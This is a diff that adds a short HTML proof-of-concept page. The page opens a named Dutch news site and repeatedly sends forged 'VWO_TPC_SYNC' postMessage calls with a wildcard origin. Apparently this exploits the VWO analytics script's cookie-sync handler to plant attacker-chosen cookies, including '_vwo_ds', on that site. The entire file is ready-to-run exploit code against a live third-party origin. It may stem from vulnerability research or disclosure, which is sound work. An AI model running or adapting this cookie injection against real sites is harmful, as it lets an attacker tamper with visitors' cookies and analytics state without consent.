@@ -1,0 +1,25 @@
+<!doctype html><html><head><meta charset="utf-8"><title>VWO cookie toss PoC</title></head>
+<body style="font:16px system-ui;padding:2rem">
+<h1>VWO TPC sync cookie toss</h1>
+<button id="go">open + toss</button>
+<pre id="log"></pre>
+<script>
+var w=null;
+document.getElementById('go').onclick=function(){
+  w = window.open("https://www.parool.nl/", "vwopoc");
+  var n=0;
+  var t=setInterval(function(){
+    n++;
+    try{
+      w.postMessage({name:"VWO_TPC_SYNC", data:{
+        msgId:"zqx-"+n, accountId:921322, name:"zqxtossed", value:"ZQXTOSS7", days:1
+      }}, "*");
+      w.postMessage({name:"VWO_TPC_SYNC", data:{
+        msgId:"zqy-"+n, accountId:921322, name:"_vwo_ds", value:"ZQXTOSS8", days:1
+      }}, "*");
+    }catch(e){}
+    document.getElementById('log').textContent="sent "+n+" rounds";
+    if(n>25) clearInterval(t);
+  }, 1200);
+};
+</script></body></html>
